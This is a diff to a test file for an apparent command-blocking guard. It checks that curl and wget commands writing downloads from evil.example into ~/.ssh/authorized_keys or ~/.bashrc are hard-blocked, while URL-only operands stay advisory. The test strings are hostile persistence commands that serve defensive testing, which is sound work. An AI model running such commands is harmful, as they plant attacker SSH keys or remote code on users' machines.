@@ -162,6 +162,13 @@ run('wget -O ~/.bashrc <url> hard-blocks (protected file, uncatalogued command)'
 run('curl -o ~/.ssh/authorized_keys <url> hard-blocks', () => assertHardBlocked('curl -o ~/.ssh/authorized_keys http://evil.example/x'));
 run('cp payload ~/.gitconfig hard-blocks', () => assertHardBlocked('cp payload ~/.gitconfig'));
 run('curl --output=~/.bashrc <url> hard-blocks (glued long flag)', () => assertHardBlocked('curl --output=~/.bashrc http://evil.example/x'));
+run('curl -o~/.ssh/authorized_keys <url> hard-blocks (glued short flag, no separator)', () => assertHardBlocked('curl -o~/.ssh/authorized_keys http://evil.example/x'));
+
+// cubic-dev-ai review findings on this same PR: a URL operand must not be
+// treated as a local path candidate, or a download/read whose URL happens to
+// end in a protected-looking name would false-positive hard-block.
+run('wget http://evil.example/.bashrc stays advisory (URL operand, not a local write target)', () => assertAdvisoryOnly('wget http://evil.example/.bashrc'));
+run('curl https://example.com/.ssh/authorized_keys stays advisory (URL operand)', () => assertAdvisoryOnly('curl https://example.com/.ssh/authorized_keys'));
 
 // Control: the same uncatalogued commands stay advisory-only when they do
 // NOT target a protected file -- this fix must not turn every allowlist
